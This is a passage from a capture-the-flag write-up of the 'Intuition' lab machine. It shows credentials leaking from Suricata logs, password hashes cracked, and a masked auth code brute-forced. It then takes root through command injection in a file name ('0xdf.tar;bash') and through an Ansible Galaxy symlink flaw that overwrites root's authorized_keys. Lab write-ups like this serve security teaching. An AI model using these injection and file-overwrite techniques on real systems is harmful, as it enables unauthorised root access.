I already have accessed FTP, though I’ll want to check back if I get creds for others users.

If I tunnel 4444 to my host, I can browse to it and see [Selenium Grid](https://www.selenium.dev/documentation/grid/):

![image-20240503163826434](/img/image-20240503163826434.png)

This is a system for running interactive tests across multiple machines. It’s not clear what’s going on here.

#### Processes

Running `ps auxww` shows a few interesting processes:

```

dev_acc@intuition:~$ ps auxww
...[snip]...
root        1337  8.8  2.9 548512 115900 ?       Ssl  14:48  29:12 /usr/bin/suricata -D --af-packet -c /etc/suricata/suricata.yaml --pidfile /run/suricata.pid
...[snip]...
root        1581  0.6  0.1 1525128 5096 ?        Sl   14:48   2:10 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.21.0.2 -container-port 80
...[snip]...
root        1619  0.0  0.0 1229560 3712 ?        Sl   14:48   0:12 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4444 -container-ip 172.21.0.4 -container-port 4444
...[snip]...
1200        1847  0.0  0.0  10104  3712 ?        S    14:48   0:00 bash /opt/bin/noVNC/utils/novnc_proxy --listen 7900 --vnc localhost:5900

```
- [Suricata](https://suricata.io/) is running.
- There’s a Docker container on 172.21.0.2 that’s getting all the traffic on 80 (so that’s the web application server).
- There’s another docker container on 172.21.0.4 that’s getting forwarded traffic on 4444.
- There’s a VNC-related service going on.

#### Web

This app is pretty weirdly laid out on the file system. Typically one would use blueprints in order to keep the routes organiszed away from the rest of the application, but this app seems to keep everything related in the various blueprint folders.

In the `auth` folder, there are `users.db` and `users.sql` files:

```

dev_acc@intuition:/var/www/app/blueprints/auth$ ls
auth.py  auth_utils.py  __pycache__  users.db  users.sql

```

The `.sql` file just defines the table:

```

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user'
)

```

The DB has two hashes:

```

dev_acc@intuition:/var/www/app/blueprints/auth$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> .headers on
sqlite> select * from users;
id|username|password|role
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev

```

#### Suricata

Suricata is a rules-base intrusion detection system (IDS). The rules definitions are stored in `/etc/suricata/rules`:

```

dev_acc@intuition:/etc/suricata/rules$ ls -l
total 128
-rw-r--r-- 1 root root  1858 Nov 17  2021 app-layer-events.rules
-rw-r--r-- 1 root root 20821 Nov 17  2021 decoder-events.rules
-rw-r--r-- 1 root root   468 Nov 17  2021 dhcp-events.rules
-rw-r--r-- 1 root root  1221 Nov 17  2021 dnp3-events.rules
-rw-r--r-- 1 root root  1041 Nov 17  2021 dns-events.rules
-rw-r--r-- 1 root root  4003 Nov 17  2021 files.rules
-rw-r--r-- 1 root root   125 Sep 28  2023 ftp-events.rules
-rw-r--r-- 1 root root  2128 Nov 17  2021 http2-events.rules
-rw-r--r-- 1 root root 13561 Sep 28  2023 http-events.rules
-rw-r--r-- 1 root root  2717 Nov 17  2021 ipsec-events.rules
-rw-r--r-- 1 root root   585 Nov 17  2021 kerberos-events.rules
-rw-r--r-- 1 root root  2078 Nov 17  2021 modbus-events.rules
-rw-r--r-- 1 root root  1847 Nov 17  2021 mqtt-events.rules
-rw-r--r-- 1 root root   558 Nov 17  2021 nfs-events.rules
-rw-r--r-- 1 root root   558 Nov 17  2021 ntp-events.rules
-rw-r--r-- 1 root root  1469 Nov 17  2021 smb-events.rules
-rw-r--r-- 1 root root  5167 Nov 17  2021 smtp-events.rules
-rw-r--r-- 1 root root 12992 Nov 17  2021 stream-events.rules
-rw-r--r-- 1 root root     0 Sep 28  2023 suricata.rules
-rw-r--r-- 1 root root  6861 Nov 17  2021 tls-events.rules

```

I’ll note that `ftp-events.rules` and `http-events.rules` have much later modification times than the others. There’s a lot in the HTTP one, but the FTP is one line:

```

dev_acc@intuition:/etc/suricata/rules$ cat ftp-events.rules 
alert ftp any any -> $HOME_NET any (msg:"FTP Failed Login Attempt"; pcre:"/^USER\s+([^[:space:]]+)/"; sid:2001; rev:2001;)

```

It’s logging failed login attempts. That’s not super interesting on it’s own, but I will check out the Suricata logs:

```

dev_acc@intuition:/var/log/suricata$ ls
eve.json                      eve.json.4.gz  fast.log.1-2024040114.backup  fast.log.7.gz                  stats.log.1-2024042918.backup  suricata.log.1                    suricata.log.6.gz
eve.json.1                    eve.json.6.gz  fast.log.1-2024042213.backup  stats.log                      stats.log.4.gz                 suricata.log.1-2024040114.backup  suricata.log.7.gz
eve.json.1-2024040114.backup  eve.json.7.gz  fast.log.1-2024042918.backup  stats.log.1                    stats.log.6.gz                 suricata.log.1-2024042213.backup
eve.json.1-2024042213.backup  fast.log       fast.log.4.gz                 stats.log.1-2024040114.backup  stats.log.7.gz                 suricata.log.1-2024042918.backup
eve.json.1-2024042918.backup  fast.log.1     fast.log.6.gz                 stats.log.1-2024042213.backup  suricata.log                   suricata.log.4.gz

```

The files ending in `.gz` are compressed. I can read them with `zcat` or `zgrep`. There’s way too much data to look through manually, but in looking around for usernames, I’ll find “adam” shows up in some HTTP logs (that don’t turn out to be interesting), but lopez shows up in FTP logs:

```

dev_acc@intuition:/var/log/suricata$ zgrep -i lopez *.gz
eve.json.7.gz:{"timestamp":"2023-09-28T17:43:36.099184+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
eve.json.7.gz:{"timestamp":"2023-09-28T17:43:52.999165+0000","flow_id":1988487100549589,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":37522,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=","ftp":{"command":"PASS","command_data":"Lopezzz1992%123","completion_code":["530"],"reply":["Authentication failed."],"reply_received":"yes"}}
eve.json.7.gz:{"timestamp":"2023-09-28T17:44:32.133372+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":1,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"USER","command_data":"lopez","completion_code":["331"],"reply":["Username ok, send password."],"reply_received":"yes"}}
eve.json.7.gz:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}

```

The password “Lopezz1992%123” is logged!

### su / SSH

This password works with `su`:

```

dev_acc@intuition:/var/log/suricata$ su - lopez
Password: 
lopez@intuition:~$ 

```

Or over SSH directly:

```

oxdf@hacky$ sshpass -p 'Lopezz1992%123' ssh lopez@comprezzor.htb
...[snip]...
lopez@intuition:~$ 

```

## Shell as root

### Enumeration

#### sudo

lopez can run `/opt/runner/runner2` as root:

```

lopez@intuition:~$ sudo -l
[sudo] password for lopez: 
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2

```

#### Groups

lopez is in the sys-adm group:

```

lopez@intuition:/opt/runner2$ id
uid=1003(lopez) gid=1003(lopez) groups=1003(lopez),1004(sys-adm)

```

This grants access to both `playbooks` and `runner2`:

```

lopez@intuition:/opt$ ls -l
total 20
drwx--x--x 4 root root    4096 Aug 26  2023 containerd
drwxr-xr-x 4 root root    4096 Sep 19  2023 ftp
drwxr-xr-x 3 root root    4096 Apr 10 08:21 google
drwxr-x--- 2 root sys-adm 4096 Apr 10 08:21 playbooks
drwxr-x--- 2 root sys-adm 4096 Apr 10 08:21 runner2

```

`/opt/playbooks` has two files, but nothing interesting:

```

lopez@intuition:/opt$ ls playbooks/
apt_update.yml  inventory.ini

```

`runner2` has a binary of the same name which is the one that lopez can run as root. Running it asks for a JSON file:

```

oxdf@hacky$ sshpass -p 'Lopezz1992%123' ssh lopez@comprezzor.htb
lopez@intuition:~$ sudo /opt/runner2/runner2 
[sudo] password for lopez: 
Usage: /opt/runner2/runner2 <json_file>

```

I can try to give it one:

```

lopez@intuition:/tmp$ echo '{}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Run key missing or invalid.

```

I can guess it needs a key `run`, but it doesn’t work with a string:

```

lopez@intuition:/tmp$ echo '{"run": "id"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Run key missing or invalid.

```

But it does work with another dict:

```

lopez@intuition:/tmp$ echo '{"run": {"cmd": "id"}}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Action key missing or invalid.
lopez@intuition:/tmp$ echo '{"run": {"action": "id"}}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Invalid 'action' value.

```

I’m making progress, but it seems better to reverse the binary and see what it needs. I’ll come back to this.

### Crack Hashes

I’ll crack the hashes from the SQLite DB with `hashcat`:

```

$ cat hashes 
admin:sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606
adam:sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43
$ hashcat hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework
...[snip]...
sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
...[snip]...

```

adam’s password is “adam gray”. The one for admin doesn’t crack.

### FTP

#### Access

This password doesn’t work for the adam account, but it does work for FTP as adam:

```

lopez@intuition:~$ ftp adam@localhost
Connected to localhost.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

There are three files in `backup/runner1`:

```

ftp> ls
229 Entering extended passive mode (|||36671|).
125 Data connection already open. Transfer starting.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
226 Transfer complete.

```

#### Files

`run-tests.sh` is a Bash script:

```

#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"

```

Most of it is commented out, but there’s a bunch of calls to `runner1`. There’s also a potential password on the last line, with the last four characters potentially masked.

`runner1.c` is presumably the source for `runner1`:

```

// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}

```

Some interesting analysis:
- There’s a variable `AUTH_KEY_HASH`, which is defined as 0feda17076d793c2ef2870d7427ad4ed.
- The `check_auth` function takes a auth\_key and MD5 hashes it to get that hash.
- The usage shows three ways to run it - list, run, and install. I’ll try these with `runner2`.
- `listPlaybooks` checks in `/opt/playbooks`.
- `runPlaybook` runs a given playbook using Ansible. However it only can run playbooks by number based on their position in `/opt/playbooks`. Given I can’t write there, that may be a deadend.
- `installRole` builds a string in the format `"%s install %s"`, where the second `%s` is use input. This seems like a good target for command injection, if it’s the same in `runner2`.

### Recover Key

I’ll write a quick Python script to recover the password. I’ll assume it starts with “UHI75GHI” and is missing four characters. That’ll be very fast to brute force using Python:

```

#!/usr/bin/env python3

import hashlib
import string
import itertools

target = "0feda17076d793c2ef2870d7427ad4ed"
prefix = "UHI75GHI"
alpha = string.ascii_uppercase + string.digits
for ending in itertools.product(alpha, repeat=4):
    password = f"{prefix}{''.join(ending)}"
    if hashlib.md5(password.encode()).hexdigest() == target:
        print(f"[+] Found password: {password}")
        break
else:
    print("[-] Failed to find password")

```

`product` will get all possible combinations and as I loop over them, I’ll hash each one and compare. It finds a match in less than a second:

```

oxdf@hacky$ time python crack.py
[+] Found password: UHI75GHINKOP

real    0m0.367s
user    0m0.367s
sys     0m0.000s

```

### Return to runner2

#### Actions

Armed with new information, I’ll come back to `runner2`. Trying “list” as an action works!

```

lopez@intuition:/tmp$ echo '{"run": {"action": "list"}}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
1: apt_update.yml

```

If I try “run”, it asks for auth:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "run"}}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Authentication key missing or invalid for 'run' action.

```

#### auth\_code

I’ll take some guesses about where it goes, but that doesn’t lead anywhere. Running strings on `runner2`, I’ll see this bunch:

```

.yml
%d: %s
/opt/playbooks/inventory.ini
/usr/bin/ansible-playbook
%s -i %s %s%s
Usage: %s <json_file>
Failed to open the JSON file
Error parsing JSON data.
action
list
auth_code
Authentication key missing or invalid for 'run' action.
Invalid playbook number.
Invalid 'num' value for 'run' action.
install
role_file
Authentication key missing or invalid for 'install' action.
Role File missing or invalid for 'install' action.
Invalid 'action' value.
Action key missing or invalid.
Run key missing or invalid.

```

`auth_code` seems promising as a way to pass the authentication code. It’s not inside the `run`, but parallel:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "run", "auth_code": "UHI75GHINKOP"}}' > t.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 t.json 
Authentication key missing or invalid for 'run' action.
lopez@intuition:/tmp$ echo '{"run": {"action": "run"}, "auth_code": "UHI75GHINKOP"}' > t.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 t.json 
Invalid 'num' value for 'run' action.

```

#### Successful run

It doesn’t work with `num` as a string, but as an int it does:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "run", "num": "1"}, "auth_code": "UHI75GHINKOP"}' > t.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 t.json 
Invalid 'num' value for 'run' action.
lopez@intuition:/tmp$ echo '{"run": {"action": "run", "num": 1}, "auth_code": "UHI75GHINKOP"}' > t.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 t.json 

PLAY [Update and Upgrade APT Packages test] ***********************************************************************************************************************************************************************

TASK [Gathering Facts] ********************************************************************************************************************************************************************************************
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? no
fatal: [127.0.0.1]: UNREACHABLE! => {"changed": false, "msg": "Failed to connect to the host via ssh: Host key verification failed.", "unreachable": true}

PLAY RECAP ********************************************************************************************************************************************************************************************************
127.0.0.1                  : ok=0    changed=0    unreachable=1    failed=0    skipped=0    rescued=0    ignored=0 

```

Unfortunately, I can still only pass a number, which is reading playbooks from a directory I can’t write to. It could be different in `runner2` from `runner1`, I’ll need to reverse the binary to see that.

#### Successful Install

`install` was the action that has a vulnerability in `runner1`. This one also requires auth:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "install"}}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Authentication key missing or invalid for 'install' action.

```

And asks for a “role file”:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "install"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Role File missing or invalid for 'install' action.

```

It seems that `role_file` is the right key:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "install", "role": "/etc/passwd"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Role File missing or invalid for 'install' action.
lopez@intuition:/tmp$ echo '{"run": {"action": "install", "role_file": "/etc/passwd"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Invalid tar archive.

```

That’s also a string in the binary:

```

lopez@intuition:/tmp$ strings /opt/runner2/runner2 | grep -i role
role_file
Role File missing or invalid for 'install' action.
installRole

```

Now it wants a valid tar archive. Just touching a file doesn’t work:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "install", "role_file": "/tmp/0xdf.tar"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Invalid tar archive.

```

But making an archive does:

```

lopez@intuition:/tmp$ rm 0xdf.tar 
lopez@intuition:/tmp$ tar -cvf 0xdf.tar 0xdf.json 
0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
[WARNING]: - /tmp/0xdf.tar was NOT installed successfully: this role does not appear to have a meta/main.yml file.
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.

```

I’ve figured out the parameters for a successful `install` subcommand (even if it fails because my role isn’t a real Ansible Galaxy role).

### Exploit runner2 Strategy

There are multiple ways to abuse this. There’s a command injection in the `install` command, or I could write a malicious `ansible-galaxy` file:

```

flowchart TD;
    A[install command]-->B(<a href='#via-command-injection'>Command Injection</a>);
    B-->C[Shell as root];
    A-->D(<a href='#via-ansible-galaxy-abuse'>Ansible Galaxy\nSymlink Issue</a>);
    D-->C;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### via Command Injection

In `runner1`, the file name was used to build a string that was run, so putting in a `;` in the file name would get command injection. I’ll try here:

```

lopez@intuition:/tmp$ echo '{"run": {"action": "install", "role_file": "/tmp/0xdf.tar;id"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Invalid tar archive.

```

It’s back to saying it’s not a valid archive. That check wasn’t in `runner1`, but I can guess that it’s taking the full file name and checking it as a file. So I’ll make an archive with a `;` in it:

```

lopez@intuition:/tmp$ cp 0xdf.tar '0xdf.tar;id'
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
[WARNING]: - /tmp/0xdf.tar was NOT installed successfully: this role does not appear to have a meta/main.yml file.
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
uid=0(root) gid=0(root) groups=0(root)

```

That’s command injection! Turning that into a shell is as simple as changing `id` to `bash`:

```

lopez@intuition:/tmp$ cp '0xdf.tar;id' '0xdf.tar;bash'
lopez@intuition:/tmp$ echo '{"run": {"action": "install", "role_file": "/tmp/0xdf.tar;bash"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
[WARNING]: - /tmp/0xdf.tar was NOT installed successfully: this role does not appear to have a meta/main.yml file.
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
root@intuition:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

```

And now I can read `root.txt`:

```

root@intuition:/tmp# cat /root/root.txt
4462144b************************

```

### via Ansible Galaxy Abuse

#### Identify Issue

In searching for Ansible exploits from around this timeframe, I’ll find two that seem similar:
- [CVE-2023-5189](https://nvd.nist.gov/vuln/detail/CVE-2023-5189) - [Ansible galaxy-importer Path Traversal vulnerability](https://github.com/advisories/GHSA-55g2-vm3q-7w52):

  > A path traversal vulnerability exists in Ansible when extracting tarballs. An attacker could craft a malicious tarball so that when using the galaxy importer of Ansible Automation Hub, a symlink could be dropped on the disk, resulting in files being overwritten.
- [CVE-2023-5115](https://nvd.nist.gov/vuln/detail/CVE-2023-5115) - [Ansible symlink attack vulnerability](https://github.com/advisories/GHSA-jpvw-p8pr-9g2x):

  > An absolute path traversal attack exists in the Ansible automation platform. This flaw allows an attacker to craft a malicious Ansible role and make the victim execute the role. A symlink can be used to overwrite a file outside of the extraction path.

The first one is in `galaxy-importer` which I don’t think is at play here, but the second is in Ansible.

#### Build Archive

What’s really cool about this vulnerability is that the [commit to fix it](https://github.com/ansible/ansible/commit/1e930684bc0a76ec3d094cd326738ad26416541c#diff-63d02f381c6bfa8fd4df0ad039d5c9ca4c918d1c9072548b9d1ba4cccf795d57) includes tests to ensure it doesn’t work.

[![image-20240504071404309](/img/image-20240504071404309.png)*Click for full size image*](/img/image-20240504071404309.png)

The test is a playbook that has a stage to create a `dangerous.tar` and the next step to run it. The `ansible-galaxy role install` command looks very similar to what I’m dealing with.

The `create-role-archive.py` script is also [in that commit](https://github.com/ansible/ansible/commit/1e930684bc0a76ec3d094cd326738ad26416541c#diff-63d02f381c6bfa8fd4df0ad039d5c9ca4c918d1c9072548b9d1ba4cccf795d57). I’ll copy that code and save a copy on Intuition. I’ll run it to make an archive:

```

lopez@intuition:/dev/shm$ python3 create.py 0xdf.tar 0xdf.json /dev/shm/.0xdf/root.json
lopez@intuition:/dev/shm/.0xdf$ tar -tvf 0xdf.tar 
-rw-rw-r-- lopez/lopez       0 2024-05-04 20:15 tmp/tmpnhaijasn/meta/main.yml
lrwxrwxrwx lopez/lopez       0 2024-05-04 20:15 tmp/tmpnhaijasn/symlink -> /dev/shm/root.json
-rw-rw-r-- lopez/lopez      87 2024-05-04 20:12 tmp/tmpnhaijasn/symlink

```

This creates a tar archive that has a `main.yml` (required to install), the data from `0xdf.json` in `symlink`, and `symlink` pointing to `/dev/shm/root.json`. When I “install” this role, it should write those contents to `root.json`. I’m picking a directory I control so that I can see that it works, and see what the result looks like.

#### Getting Correct Directory

If I run this the way I have been running, it fails:

```

lopez@intuition:/dev/shm$ echo '{"run": {"action": "install", "role_file": "/dev/shm/0xdf.tar"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/dev/shm$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
- extracting /dev/shm/0xdf.tar to /dev/shm/0xdf.tar
[WARNING]: - /dev/shm/0xdf.tar was NOT installed successfully: the specified roles path exists and is not a directory.
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.

```

The issue is in the “extracting `/dev/shm/0xdf.tar` to `/dev/shm/0xdf.tar`” line. It’s got a directory where it stores roles, and it’s trying to append `/dev/shm/0xdf.tar` to that path (since Ansible is Python perhaps with the weird behavior where if the second thing joining starts with `/` it just loses the stuff before it as I exploited in [OnlyForYou](/2023/08/26/htb-onlyforyou.html#vulnerability-background)), and then fails.

I’ll just give the filename in the same directory:

```

lopez@intuition:/dev/shm$ echo '{"run": {"action": "install", "role_file": "0xdf.tar"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/dev/shm$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
- extracting 0xdf.tar to /root/.ansible/roles/0xdf.tar
- 0xdf.tar was installed successfully
[WARNING]: Meta file /root/.ansible/roles/0xdf.tar is empty. Skipping dependencies.
lopez@intuition:/dev/shm/.0xdf$ ls -l root.json 
-rw-rw-r-- 1 lopez lopez 87 May  4 20:12 root.json

```

It worked! It’s extracting to a directory in `/root`, and `root.json` is created outside that directory.

#### Getting Correct Permissions

But there’s an issue - `root.json` is owned by lopez, not root. Looking back at the listing of the Tar archive, I can see it’s owned by lopez in there as well. The ownership is being preserved.

I’ll come back to my VM and get a shell running as root, create the script, and run it to create the archive:

```

root@hacky[~]# python create-role-archive.py 0xdf.tar ed25519_gen.pub /dev/shm/.0xdf/root
root@hacky[~]# tar -tvf 0xdf.tar 
-rw-r--r-- root/root         0 2024-05-04 16:31 tmp/tmpufykaa8z/meta/main.yml
lrwxrwxrwx root/root         0 2024-05-04 16:31 tmp/tmpufykaa8z/symlink -> /dev/shm/.0xdf/root
-rw------- root/root        96 2024-05-04 16:30 tmp/tmpufykaa8z/symlink

```

Not only is the ownership correct, but the permissions are also what I want the eventual target to be. I’ll transfer that to Intuition and run again, but it fails:

```

lopez@intuition:/dev/shm/.0xdf$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
- extracting 0xdf.tar to /root/.ansible/roles/0xdf.tar
- 0xdf.tar was installed successfully
[WARNING]: Meta file /root/.ansible/roles/0xdf.tar is empty. Skipping dependencies.

```

I can’t install the same name twice. I’ll rename it:

```

lopez@intuition:/dev/shm/.0xdf$ mv 0xdf.tar 0xdf2.tar
lopez@intuition:/dev/shm/.0xdf$ echo '{"run": {"action": "install", "role_file": "0xdf2.tar"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json
lopez@intuition:/dev/shm/.0xdf$ sudo /opt/runner2/runner2 0xdf.json 
Starting galaxy role install process
- extracting 0xdf2.tar to /root/.ansible/roles/0xdf2.tar
- 0xdf2.tar was installed successfully
[WARNING]: Meta file /root/.ansible/roles/0xdf2.tar is empty. Skipping dependencies.
lopez@intuition:/dev/shm/.0xdf$ ls -l root 
-rw------- 1 root root 96 May  4 20:30 root

```

It worked!

#### Shell

To finally exploit this, I’ll re-make the tar one more time, pointing at `/root/.ssh/authorized_keys`:

```

root@hacky[~]# python create-role-archive.py 0xdf3.tar ed25519_gen.pub /root/.ssh/authorized_keys

```

